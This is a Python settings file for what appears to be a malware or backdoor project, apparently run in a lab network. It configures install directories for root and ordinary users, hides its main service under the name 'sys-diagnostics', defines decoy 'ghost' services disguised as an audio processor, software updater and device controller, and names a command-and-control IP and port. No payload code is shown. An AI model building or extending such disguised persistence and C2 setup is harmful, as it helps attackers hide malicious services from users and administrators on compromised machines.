from os import popen

#settings if run as root
root = {"ghostDir": "/etc/", "targetDir": "/etc/", "serviceDir": "/etc/systemd/system/"}

#settings if run without root
user = {"ghostDir": "~/.config/", "targetDir": "~/", "serviceDir": "~/.config/systemd/user/"}

#folderName
dirName= "sysDiag"

#name of serveral files
tarName = "systemDiagnostics.tar"
serviceName = "sys-diagnostics"

#description of main service
serviceDesc = "tracks system details"

#data for ghost processes
#list of tuples: (fileName, serviceName, serviceDescription)
ghosts = [("audioProc", "audioProcessor", "provides audio control"),
	("updater", "softwareUpdater", "keeps software up to date"),
	("ioControl", "ioControl", "controls generic peripheral devices")]


#data for connection
port = 65432
cncIP = "192.168.56.105"
HOST = popen("ip -br a | grep UP | head -1 | awk '{print $3}'").read()[:-4]
